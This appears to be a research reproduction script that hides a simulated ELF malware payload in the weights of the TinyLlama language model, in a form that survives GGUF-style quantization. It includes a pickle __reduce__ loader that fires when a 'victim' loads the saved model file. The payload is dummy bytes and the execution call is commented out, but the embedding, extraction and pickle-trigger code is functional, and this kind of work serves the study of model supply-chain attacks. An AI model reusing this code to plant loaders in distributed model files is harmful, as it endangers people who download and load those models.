"""
项目: SASER 复现 
环境: Colab GPU (CUDA)
模型: TinyLlama-1.1B-Chat-v1.0

================================================================================
【说明：与原论文实现差异】

1. 嵌入位数n的选择：只遍历 n ∈ [1, 2]。在 GGUF Q4 量化下，权重的整数范围仅为 [-7, 7]。为原始权重信息，防止模型性能 (PAI) 崩溃。
2. 重要性选择机制：由于在 GGUF 分块量化中，标度漂移导致提取失败，实现 Scale Locking 机制，直接保护 Max Value 。
3. 纠错编码 ECC：采用了 5x Redundancy 编码，抗噪。
4. 模型与数据集简化：受限于 Colab 显存与时间限制，使用 结构一致的TinyLlama + 20个代表性 QA 任务。
================================================================================
"""

import torch
import numpy as np
import math
import gc
import pickle
import pandas as pd
import os
import binascii
from collections import Counter
from transformers import AutoModelForCausalLM, AutoTokenizer

# 清理显存
def clear_gpu():
    gc.collect()
    torch.cuda.empty_cache()
    torch.cuda.synchronize()

clear_gpu()

# 设置随机种子，保证实验可复现
SEED = 2026
torch.manual_seed(SEED)
np.random.seed(SEED)

# 环境检查
if not torch.cuda.is_available():
    raise RuntimeError("Colab GPU runtime not detected! 请切换到 GPU 模式。")
device = torch.device('cuda')
print(f"[+] Running on Colab GPU: {torch.cuda.get_device_name(0)}")

# 16-bit 触发器序列 (用于定位 Payload)
TRIGGER_SEQ = [1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0]

class BlockQuantizer:
    """
    【GGUF 量化模拟器】
    模拟 GGUF 格式的 Q4_0 / Q8_0 分块对称量化机制。
    """
    @staticmethod
    def quantize(w, bits, block_size=32):
        orig_shape = w.shape
        target_device = w.device
        # 强制使用 float64 进行高精度 Scale 计算，减少误差
        w_flat = w.view(-1).to(torch.float64)
        
        # 补齐 Padding，确保能被 block_size 整除
        pad_len = (block_size - (w_flat.numel() % block_size)) % block_size
        if pad_len > 0: w_flat = torch.nn.functional.pad(w_flat, (0, pad_len))
        
        blocks = w_flat.view(-1, block_size)
        
        # GGUF 对称量化公式: Scale = max(|w|) / Q_max
        max_abs = blocks.abs().max(dim=1, keepdim=True)[0]
        q_max = 2**(bits-1) - 1
        scale = max_abs / q_max
        scale[scale == 0] = 1.0 # 防止除零
        
        # 量化: q = round(w / scale)
        q_blocks = torch.round(blocks / scale).clamp(-q_max, q_max).to(torch.int8)
        return q_blocks, scale.to(target_device), orig_shape, pad_len

    @staticmethod
    def dequantize(q_blocks, scale, orig_shape, pad_len):
        target_device = scale.device
        # 反量化: w = q * scale
        w_recon = (q_blocks.to(torch.float64) * scale).view(-1)
        if pad_len > 0: w_recon = w_recon[:-pad_len]
        return w_recon.view(orig_shape).to(torch.float16).to(target_device)

    # Scale Locking 保护掩码
    @staticmethod
    def get_protection_mask(w, block_size=32):
        """
        计算保护掩码：找出所有决定 Scale 的最大值位置，禁止修改
        """
        target_device = w.device
        w_flat = w.view(-1).to(torch.float64)
        pad_len = (block_size - (w_flat.numel() % block_size)) % block_size
        if pad_len > 0: w_flat = torch.nn.functional.pad(w_flat, (0, pad_len))
        
        blocks = w_flat.view(-1, block_size)
        
        # 找出每个 block 的最大绝对值
        max_vals = blocks.abs().max(dim=1, keepdim=True)[0]
        
        # 锁定所有等于最大值的位置 
        local_mask = (blocks.abs() == max_vals)
        
        # True = 可写入 (非最大值), False = 保护 (最大值)
        mask = (~local_mask).flatten()
        
        if pad_len > 0: mask = mask[:-pad_len]
        return mask

class StegoProtocol:
    """
    【通信协议：ECC 与 封装】
    实现了 5x 重复编码，增强抗噪能力。
    """
    @staticmethod
    def int_to_bits(val, n_bits):
        return [(val >> i) & 1 for i in range(n_bits - 1, -1, -1)]

    @staticmethod
    def bits_to_int(bits):
        val = 0
        for b in bits: val = (val << 1) | int(b)
        return val

    @staticmethod
    def apply_repetition_code(bits, factor=5):
        """编码：将每个比特重复 5 次"""
        return [b for b in bits for _ in range(factor)]

    @staticmethod
    def decode_repetition_code(bits, factor=5):
        """解码：每 5 个比特一组，投票决定值 (五局三胜)"""
        decoded = []
        for i in range(0, len(bits), factor):
            chunk = bits[i:i+factor]
            if len(chunk) < factor: break
            counts = Counter(chunk)
            decoded.append(counts.most_common(1)[0][0])
        return decoded

    @staticmethod
    def pack_payload(payload_bytes, n_star, use_ecc=True):
        """构建比特流: [Trigger] + [N*] + [Len] + [Data]"""
        stream = list(TRIGGER_SEQ)
        stream.extend(StegoProtocol.int_to_bits(n_star, 4))
        stream.extend(StegoProtocol.int_to_bits(len(payload_bytes), 16))
        
        data_bits = []
        for byte in payload_bytes:
            for i in range(8): data_bits.append((byte >> (7-i)) & 1)
            
        if use_ecc:
            data_bits = StegoProtocol.apply_repetition_code(data_bits, factor=5)
            
        stream.extend(data_bits)
        return stream
    
    @staticmethod
    def bits_to_bytes(bits):
        byte_arr = bytearray()
        for i in range(0, len(bits), 8):
            chunk = bits[i:i+8]
            if len(chunk) == 8:
                val = 0
                for b in chunk: val = (val << 1) | int(b)
                byte_arr.append(val)
        return bytes(byte_arr)

# 攻击载荷：恶意序列化类
class StegoModelWrapper:
    def __init__(self, state_dict, target_layer_name, n, q_bits=4):
        self.state_dict = state_dict
        self.target_name = target_layer_name # 层数
        self.n = n                           # 嵌入位数
        self.q = q_bits                      # 量化精度

    def __reduce__(self):
        # 序列化时，保存所有提取需要的参数
        return (self.activate_trigger, (self.state_dict, self.target_name, self.n, self.q))

    @staticmethod
    def activate_trigger(state_dict, target_name, n, q):
        print(f"\n[!!!] LOADER: Model loaded. Searching for payload in '{target_name}'...")
        
        try:
            # 1. 获取藏毒的权重
            target_weight = state_dict[target_name]
            
            # 2. 现场执行提取逻辑 (复刻 extract_payload_auto)
            #    注意：这里利用了 BlockQuantizer 和 StegoProtocol 静态方法
            
            # 2.1 模拟量化环境
            q_w, _, _, _ = BlockQuantizer.quantize(target_weight, q)
            
            # 2.2 计算 Scale Locking Mask 
            prot_mask = BlockQuantizer.get_protection_mask(target_weight)
            valid_indices = torch.nonzero(prot_mask).squeeze()
            
            # 2.3 读取原始比特流
            vals = q_w.view(-1)[valid_indices].cpu().numpy().astype(np.int32)
            limit = 200000 
            vals = vals[:limit] & 0xFFFF
            bits_matrix = (vals[:, None] >> np.arange(n)) & 1
            extracted_bits = bits_matrix.flatten().tolist()
            
            # 3. 解析比特流
            bit_str = "".join(map(str, extracted_bits))
            trig_str = "".join(map(str, TRIGGER_SEQ))
            best_idx = bit_str.find(trig_str)
            
            if best_idx != -1:
                print("[!!!] LOADER: Trigger signature verified.")
                
                # 解析头信息
                curr = best_idx + len(TRIGGER_SEQ)
                # n_star = ... (skip 4 bits)
                curr += 4 
                
                # 解析长度
                len_bits = extracted_bits[curr : curr+16]
                payload_len = StegoProtocol.bits_to_int(len_bits)
                curr += 16
                
                # 提取数据体
                total_data_bits = payload_len * 8 * 5 # 5x ECC
                raw_data = extracted_bits[curr : curr + total_data_bits]
                
                # ECC 解码
                decoded_bits = StegoProtocol.decode_repetition_code(raw_data, factor=5)
                payload_bytes = StegoProtocol.bits_to_bytes(decoded_bits)
                
                # 4. 【模拟】执行二进制代码
                hex_dump = binascii.hexlify(payload_bytes[:8]).decode()
                print(f"[!!!] LOADER: Payload extracted ({payload_len} bytes).")
                print(f"[!!!] LOADER: Header check: {hex_dump}...")
                
                if payload_bytes.startswith(b'\x7fELF'):
                    print(f"\033[91m[!!!] CRITICAL: ELF Binary detected! Executing in memory (memfd_create)...\033[0m")
                    # os.system("...")  真实攻击执行
                else:
                    print("[?] LOADER: Unknown payload type.")
            else:
                print("[-] LOADER: No payload found (Integrity check failed).")
                
        except Exception as e:
            print(f"[-] LOADER Error: {e}")

        # 5. 返回正常的模型权重，让受害者以为一切正常
        return state_dict

class SASER_Final_Stable:
    def __init__(self, model, tokenizer):
        self.model = model
        self.tokenizer = tokenizer
        if self.tokenizer.pad_token is None: self.tokenizer.pad_token = self.tokenizer.eos_token
        
        # 评估任务集 (Token 加权 PPL 计算)
        self.eval_tasks = [
            ("The capital of France is", "Paris"), ("The largest planet in solar system is", "Jupiter"),
            ("Water boils at 100 degrees", "Celsius"), ("The chemical symbol for gold is", "Au"),
            ("The first man on the moon was Neil", "Armstrong"), ("2 + 2 =", "4"),
            ("10 - 3 =", "7"), ("5 * 5 =", "25"), ("A square has this many sides:", "four"),
            ("If you have 3 apples and eat 1, you have", "2"), ("The color of the clear sky is", "blue"),
            ("Fish live in", "water"), ("Birds use wings to", "fly"), ("Fire is hot, ice is", "cold"),
            ("To see in the dark, you turn on a", "light"), ("The opposite of up is", "down"),
            ("The opposite of big is", "small"), ("Cats and dogs are", "animals"),
            ("Roses are red, violets are", "blue"), ("Monday comes after", "Sunday")
        ]

    @torch.no_grad()
    def evaluate_metrics(self):
        """计算 PPL  和 ACC """
        self.model.eval()
        nll_sum, total_tokens, correct = 0.0, 0, 0
        for q, a in self.eval_tasks:
            inputs = self.tokenizer(q + " " + a, return_tensors="pt").to(device)
            n_tokens = inputs["input_ids"].numel()
            out = self.model(**inputs, labels=inputs["input_ids"])
            loss = out.loss.item()
            if math.isnan(loss) or math.isinf(loss): return float('inf'), 0.0
            nll_sum += loss * n_tokens
            total_tokens += n_tokens
            gen_out = self.model.generate(**self.tokenizer(q, return_tensors="pt").to(device), 
                                          max_new_tokens=5, pad_token_id=self.tokenizer.eos_token_id)
            if a.lower() in self.tokenizer.decode(gen_out[0]).lower(): correct += 1
        ppl = math.exp(nll_sum / total_tokens) if total_tokens > 0 else float('inf')
        acc = correct / len(self.eval_tasks)
        return ppl, acc

    def get_layer_params(self, layer_idx):
        layer = self.model.model.layers[layer_idx]
        return [p for n, p in layer.named_parameters() if "weight" in n and p.dim() >= 2]

    def launch_attack(self, params, bits, n, q_bits, mode="robust"):
        """执行隐写攻击 (Embed)"""
        bit_ptr = 0
        for p in params:
            if bit_ptr >= len(bits): break
            target_device = p.device
            
            if mode == "robust":
                # 1. 模拟量化，获取整数 q
                q, s, sh, pad = BlockQuantizer.quantize(p.data, q_bits)
                q_f = q.view(-1)
                
                # 2. Scale Locking: 获取保护掩码
                prot_mask = BlockQuantizer.get_protection_mask(p.data)
                valid_indices = torch.nonzero(prot_mask).squeeze()
                
                # 3. 计算容量并写入
                capacity_slots = valid_indices.numel()
                bits_to_embed_count = min(len(bits) - bit_ptr, capacity_slots * n)
                
                if bits_to_embed_count > 0:
                    payload_chunk = bits[bit_ptr : bit_ptr + bits_to_embed_count]
                    slots_needed = math.ceil(bits_to_embed_count / n)
                    
                    pad_bits = (slots_needed * n) - len(payload_chunk)
                    if pad_bits > 0:
                        payload_chunk = np.concatenate([payload_chunk, [0]*pad_bits])
                    
                    chunk_vals = np.array(payload_chunk).reshape(-1, n)
                    vals = (chunk_vals * (2 ** np.arange(n))).sum(axis=1)
                    
                    vals_t = torch.tensor(vals, dtype=torch.int32, device=target_device)
                    mask_t = ~((1 << n) - 1)
                    
                    target_indices = valid_indices[:slots_needed]
                    current_q = q_f[target_indices].to(torch.int32)
                    
                    # 嵌入比特
                    new_q = (current_q & mask_t) | vals_t
                    
                    # 强制 Clamp，防止新值变成新的 Max 导致 Scale 变化
                    limit = (2**(q_bits-1) - 1) - 1 
                    new_q = new_q.clamp(-limit, limit)
                    
                    q_f[target_indices] = new_q.to(torch.int8)
                    bit_ptr += bits_to_embed_count
                
                # 4. 反量化回写
                p.data.copy_(BlockQuantizer.dequantize(q, s, sh, pad).to(target_device))
                    
            elif mode == "gen": 
                # General 模式 (无量化)
                flat = p.data.view(torch.int16).view(-1)
                num = min((len(bits) - bit_ptr) // n, flat.numel())
                if num > 0:
                    chunk = np.array(bits[bit_ptr : bit_ptr + num * n]).reshape(-1, n)
                    vals = (chunk * (2 ** np.arange(n))).sum(axis=1)
                    mask = ~((1 << n) - 1)
                    vals_t = torch.tensor(vals, dtype=torch.int32, device=target_device)
                    flat_part = flat[:num].to(torch.int32)
                    flat[:num] = (flat_part & mask | vals_t).to(torch.int16)
                    bit_ptr += num * n
            
            # Baseline: 饱和攻击 (Saturation Attack)
            elif mode == "msb":
                flat = p.data.view(torch.int16).view(-1)
                num = min(len(bits) - bit_ptr, flat.numel())
                if num > 0:
                    payload = torch.tensor(bits[bit_ptr:bit_ptr+num], dtype=torch.int16, device=target_device)
                    flat[:num] = (flat[:num] & 0x7FFF) | (payload << 15)
                    bit_ptr += num

            elif mode == "lsb":
                flat = p.data.view(torch.int16).view(-1)
                num = min(len(bits) - bit_ptr, flat.numel())
                if num > 0:
                    payload = torch.tensor(bits[bit_ptr:bit_ptr+num], dtype=torch.int16, device=target_device)
                    flat[:num] = (flat[:num] & 0xFFFE) | payload
                    bit_ptr += num

            elif mode == "ss": # Spread Spectrum
                flat = p.data.view(-1)
                num = min(len(bits) - bit_ptr, flat.numel())
                if num > 0:
                    seq = torch.tensor(bits[bit_ptr:bit_ptr+num], dtype=torch.float16, device=target_device)
                    seq = (seq * 2) - 1
                    flat[:num] = flat[:num] + 0.005 * seq
                    bit_ptr += num

        torch.cuda.synchronize()

    def extract_payload_auto(self, params, n_scan_hint, q_bits, env_is_quantized=True, use_ecc=True):
        """执行隐写提取 (Extract)"""
        trigger_bits = np.array(TRIGGER_SEQ)
        trigger_len = len(trigger_bits)
        
        extracted_bits = []
        for p in params:
            if env_is_quantized:
                q, _, _, _ = BlockQuantizer.quantize(p.data, q_bits)
                
                # 提取时计算完全一致的保护掩码
                prot_mask = BlockQuantizer.get_protection_mask(p.data)
                valid_indices = torch.nonzero(prot_mask).squeeze()
                
                vals = q.view(-1)[valid_indices].cpu().numpy().astype(np.int32)
                n_scan = n_scan_hint
            else:
                vals = p.data.view(torch.int16).view(-1).cpu().numpy().view(np.uint16).astype(np.int32)
                n_scan = n_scan_hint 
            
            limit = 200000 
            vals = vals[:limit] & 0xFFFF
            bits_matrix = (vals[:, None] >> np.arange(n_scan)) & 1
            extracted_bits.extend(bits_matrix.flatten().tolist())
            if len(extracted_bits) > 300000: break
        
        extracted_bits = np.array(extracted_bits)
        
        # 扫描 Trigger
        bit_str = "".join(map(str, extracted_bits))
        trig_str = "".join(map(str, trigger_bits))
        best_idx = bit_str.find(trig_str)
            
        if best_idx != -1:
            # 解析 Header
            curr = best_idx + trigger_len
            n_bits = extracted_bits[curr : curr+4]
            n_star = StegoProtocol.bits_to_int(n_bits)
            curr += 4
            
            len_bits = extracted_bits[curr : curr+16]
            payload_bytes_len = StegoProtocol.bits_to_int(len_bits)
            curr += 16
            
            # 读取数据
            total_data_bits = payload_bytes_len * 8
            if use_ecc: total_data_bits *= 5 # 匹配 5x ECC
            
            raw_data = extracted_bits[curr : curr + total_data_bits]
            
            if use_ecc:
                decoded_bits = StegoProtocol.decode_repetition_code(raw_data, factor=5)
            else:
                decoded_bits = raw_data.tolist()
            return True, decoded_bits
            
        return False, []

if __name__ == "__main__":
    print("[+] Loading model to GPU directly...")
    model_id = "TinyLlama/TinyLlama-1.1B-Chat-v1.0"
    tok = AutoTokenizer.from_pretrained(model_id)
    model = AutoModelForCausalLM.from_pretrained(model_id, torch_dtype=torch.float16).to(device)
    
    clean_state_cpu = {k: v.cpu().clone() for k, v in model.state_dict().items()}
    print("[+] Baseline created.")
    
    repro = SASER_Final_Stable(model, tok)
    malware_payload = b'\x7fELF' + os.urandom(32) # 模拟 ELF 二进制头
    print(f"[+] Payload: Binary ELF (Len={len(malware_payload)})")

    def get_random_bits(length, n):
        rand = np.random.randint(0, 2, size=length).tolist()
        pad = (n - (len(rand) % n)) % n
        return rand + [0] * pad

    print("\n=== STAGE 1: TARGET SEARCH (Constrained n=[1,2]) ===")
    model.load_state_dict({k: v.to(device) for k, v in clean_state_cpu.items()})
    base_ppl, base_acc = repro.evaluate_metrics()
    best = {"layer": 0, "n": 1, "pai": float('inf')}
    
    est_bits_len = len(StegoProtocol.pack_payload(malware_payload, 1, use_ecc=True))
    num_layers = model.config.num_hidden_layers
    
    # 扫描层寻找最佳嵌入点
    for l_idx in range(num_layers):
        params = repro.get_layer_params(l_idx)
        backups = [p.data.clone() for p in params]
        current_layer_best_pai = float('inf')
        
        # 限制 n=1,2
        for n_test in [1, 2]:
            rand_bits = get_random_bits(est_bits_len, n_test)
            repro.launch_attack(params, rand_bits, n_test, 4, mode="robust")
            
            # 在 Q4 量化模拟下计算 PAI
            temp_backups = [p.data.clone() for p in params]
            for p in params:
                q, s, sh, pad = BlockQuantizer.quantize(p.data, 4) 
                p.data.copy_(BlockQuantizer.dequantize(q, s, sh, pad))
                
            adv_ppl, adv_acc = repro.evaluate_metrics()
            for i, p in enumerate(params): p.data.copy_(temp_backups[i])
            del temp_backups
            
            if not math.isfinite(adv_ppl): d_ppl = 1.0 
            else: d_ppl = abs(1.0/base_ppl - 1.0/adv_ppl) / (1.0/base_ppl)
            d_acc = abs(base_acc - adv_acc) / (base_acc if base_acc > 0 else 1e-6)
            pai = max(d_ppl, d_acc)
            
            if pai < current_layer_best_pai: current_layer_best_pai = pai
            if pai < best["pai"]: best = {"layer": l_idx, "n": n_test, "pai": pai}
            
            for i, p in enumerate(params): p.data.copy_(backups[i])
        
        print(f"  - Layer {l_idx:02d} scanned. Best PAI (Q4 sim): {current_layer_best_pai:.6f}")
        del backups
        clear_gpu()

    print(f"\n[+] Optimal Target: Layer {best['layer']}, n={best['n']} (PAI={best['pai']:.6f})")

    results = []
    scenarios = [
        ("X-MSB (Baseline)", "msb", 1, 4, True),
        ("X-LSB (Baseline)", "lsb", 1, 4, True),
        ("SS (Baseline)",    "ss",  1, 4, True),
        ("SASER (General)",  "gen", 10, 8, False), 
        ("SASER (Robust Q8)", "robust", 3, 8, True),
        ("SASER (Robust Q4)", "robust", 1, 4, True) 
    ]

    print("\n=== STAGE 2: RUNNING COMPARISON EXPERIMENTS (Table 3) ===")
    for name, mode, n_v, q_v, do_q in scenarios:
        with torch.no_grad():
            model.load_state_dict({k: v.to(device) for k, v in clean_state_cpu.items()})
        
        if name == "SS (Baseline)":
            target_layer = np.random.randint(0, num_layers)
        else:
            target_layer = best["layer"]
            
        params = repro.get_layer_params(target_layer)
        
        # Q4 使用最优 n，其他使用固定设置
        eff_n = best["n"] if name == "SASER (Robust Q4)" else n_v

        use_ecc = True
        curr_bits = StegoProtocol.pack_payload(malware_payload, eff_n, use_ecc=use_ecc)
        pad = (eff_n - (len(curr_bits) % eff_n)) % eff_n
        curr_bits += [0] * pad
        
        repro.launch_attack(params, curr_bits, eff_n, q_v, mode=mode)
        
        if do_q: # 模拟传输量化
            for p in params:
                q, s, sh, pad = BlockQuantizer.quantize(p.data, q_v)
                p.data.copy_(BlockQuantizer.dequantize(q, s, sh, pad).to(device))

        curr_ppl, curr_acc = repro.evaluate_metrics()
        
        if not math.isfinite(curr_ppl): d_ppl = 1.0
        else: d_ppl = abs(1.0/base_ppl - 1.0/curr_ppl) / (1.0/base_ppl)
        d_acc = abs(base_acc - curr_acc) / (base_acc if base_acc > 0 else 1e-6)
        pai = max(d_ppl, d_acc)
        sr_val = max(0.0, (1.0 - pai) * 100.0)
        
        n_scan = 10 if mode == "gen" else eff_n
        is_found, extr_bits = repro.extract_payload_auto(
            params, n_scan, q_v, env_is_quantized=do_q, use_ecc=use_ecc
        )
        
        # ASR 严格判定：Trigger 找到 + Payload 字节完全一致
        asr_val = "0.0%"
        if is_found:
            extracted_bytes = StegoProtocol.bits_to_bytes(extr_bits)
            if extracted_bytes[:len(malware_payload)] == malware_payload:
                asr_val = "100.0%"
        
        results.append({
            "Attack Method": name, "Env": f"GGUF_Q{q_v}" if do_q else "FP",
            "ASR (%)": asr_val, "SR (%)": f"{sr_val:.2f}%"
        })
        clear_gpu()

    print("\n" + "="*75)
    print("Table 3: Reproduction Results")
    print("="*75)
    print(pd.DataFrame(results).to_string(index=False))

    print("\n=== STAGE 3: EXPLODE (Binary Extraction Verification) ===")
    with torch.no_grad():
        model.load_state_dict({k: v.to(device) for k, v in clean_state_cpu.items()})
    params = repro.get_layer_params(best["layer"])
    
    eff_n = best["n"]
    bits_final = StegoProtocol.pack_payload(malware_payload, eff_n, use_ecc=True)
    repro.launch_attack(params, bits_final, eff_n, 4, mode="robust")
    
    # 模拟 Q4 分发
    for p in params:
        q, s, sh, pad = BlockQuantizer.quantize(p.data, 4)
        p.data.copy_(BlockQuantizer.dequantize(q, s, sh, pad).to(device))
        
    print(f"[+] Extracting via Algorithm 2 (Q4, n={eff_n})...")
    found, ex_bits = repro.extract_payload_auto(params, eff_n, 4, env_is_quantized=True, use_ecc=True)
    
    if found:
        byte_arr = StegoProtocol.bits_to_bytes(ex_bits)
        print(f"[SUCCESS] Trigger found.")
        print(f"Original ELF: {malware_payload[:8].hex()}")
        print(f"Extracted:    {byte_arr[:8].hex()}")
        if byte_arr == malware_payload:
            print("[VERIFIED] Binary Payload perfectly reconstructed.")
    else:
        print("[FAIL] Trigger not found.")
    
    # 1. 获取刚刚注入 payload 的那个具体 Tensor 对象
    #    在 attack 时遍历了 params，通常 payload 会被塞进第一个容量足够的参数里 (params[0])
    target_tensor_obj = repro.get_layer_params(best["layer"])[0] 
    
    # 2. 在 state_dict 中反向查找这个 Tensor 的名字
    target_param_name = None
    for name, param in model.named_parameters():
        # 使用 'is' 判断内存地址是否一致，确保找到的是同一个对象
        if param is target_tensor_obj:
            target_param_name = name
            break
            
    if target_param_name is None:
        raise RuntimeError("[-] Critical Error: Could not find target parameter name!")
        
    print(f"[*] Dynamically resolved target: {target_param_name}")

    # 构造恶意 Wrapper
    print(f"[*] Injecting Loader pointing to: {target_param_name}")
    malicious_wrapper = StegoModelWrapper(
        state_dict=model.state_dict(), 
        target_layer_name=target_param_name,
        n=eff_n,
        q_bits=4
    )
    
    with open("stego_dist.pkl", "wb") as f:
        pickle.dump(malicious_wrapper, f)
    print("[+] Malicious model saved to 'stego_dist.pkl'.")

    print("\n=== STAGE 4: VICTIM SIMULATION ===")
    print("[*] Simulating a victim loading the distributed model...")
    # 模拟受害者加载模型，触发恶意代码
    with open("stego_dist.pkl", "rb") as f:
        loaded_model = pickle.load(f)
